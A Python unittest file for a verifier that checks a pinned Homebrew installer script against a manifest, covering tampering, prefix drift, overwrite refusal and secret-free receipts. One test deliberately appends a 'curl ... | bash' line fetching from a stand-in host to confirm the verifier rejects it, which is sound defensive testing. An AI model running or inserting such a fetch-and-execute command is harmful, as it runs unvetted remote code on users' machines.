#!/usr/bin/env python3
"""Regression tests for the fork-safe Homebrew installer verifier."""

from __future__ import annotations

import copy
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))

import verify


class VerifyTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.manifest = verify.load_manifest()

    def test_manifest_source_and_workflows_are_closed(self) -> None:
        verify.validate_manifest(self.manifest)
        verify.verify_source(self.manifest)
        verify.verify_workflows(self.manifest)

    def test_promoted_commit_is_a_valid_upstream_candidate(self) -> None:
        verify.verify_candidate(self.manifest, self.manifest["authority"]["commit"])

    def test_tampered_installer_is_rejected(self) -> None:
        data = verify.verified_install_bytes(self.manifest) + b"\n# tampered\n"
        with self.assertRaisesRegex(verify.VerificationError, "byte count mismatch"):
            verify.verify_file_bytes(
                "install.sh",
                data,
                self.manifest["authority"]["files"]["install.sh"],
            )

    def test_darwin_contract_rejects_prefix_drift(self) -> None:
        data = verify.verified_install_bytes(self.manifest).replace(
            b'HOMEBREW_PREFIX="/opt/homebrew"',
            b'HOMEBREW_PREFIX="/tmp/not-homebrew"',
        )
        with self.assertRaisesRegex(verify.VerificationError, "Darwin prefix"):
            verify.verify_darwin_contract(data, self.manifest, "tampered-prefix")

    def test_darwin_contract_rejects_remote_shell_pipe(self) -> None:
        data = (
            verify.verified_install_bytes(self.manifest)
            + b"\ncurl https://invalid.example | bash\n"
        )
        with self.assertRaisesRegex(verify.VerificationError, "piped into a shell"):
            verify.verify_darwin_contract(data, self.manifest, "remote-exec")

    def test_materialize_is_exact_and_refuses_overwrite(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "install.sh"
            receipt_path = Path(directory) / "receipt.json"
            receipt = verify.materialize(
                self.manifest,
                destination,
                receipt_path,
                download=False,
            )
            self.assertEqual(
                verify.sha256_bytes(destination.read_bytes()),
                self.manifest["authority"]["files"]["install.sh"]["sha256"],
            )
            self.assertFalse(receipt["executed"])
            self.assertEqual(os.stat(destination).st_mode & 0o777, 0o500)
            self.assertEqual(json.loads(receipt_path.read_text()), receipt)
            with self.assertRaisesRegex(verify.VerificationError, "overwrite"):
                verify.materialize(self.manifest, destination, None, download=False)

    def test_tamper_is_rejected_before_destination_exists(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "install.sh"
            data = verify.verified_install_bytes(self.manifest)[:-1]
            with self.assertRaises(verify.VerificationError):
                verify.atomic_materialize(
                    destination,
                    data,
                    self.manifest["authority"]["files"]["install.sh"],
                )
            self.assertFalse(destination.exists())

    def test_safe_entrypoints_do_not_change_declared_host_boundaries(self) -> None:
        result = verify.probe_safe_entrypoints(self.manifest)
        self.assertTrue(result["hostBoundariesUnchanged"])
        self.assertEqual(
            [probe["exitCode"] for probe in result["probes"]], [0, 1, 1, 1, 1]
        )

    def test_receipt_never_collects_secret_shaped_environment(self) -> None:
        fabricated = "fabricated-token-that-is-not-a-secret"
        with mock.patch.dict(os.environ, {"HOMEBREW_GITHUB_API_TOKEN": fabricated}):
            receipt = verify.receipt_for(
                self.manifest, Path("/tmp/verified-install.sh")
            )
        self.assertNotIn(fabricated, json.dumps(receipt, sort_keys=True))
        self.assertNotIn("HOMEBREW_GITHUB_API_TOKEN", receipt)

    def test_manifest_rejects_authority_drift(self) -> None:
        manifest = copy.deepcopy(self.manifest)
        manifest["authority"]["commit"] = "0" * 40
        with self.assertRaisesRegex(verify.VerificationError, "dotfiles #49"):
            verify.validate_manifest(manifest)


if __name__ == "__main__":
    unittest.main()
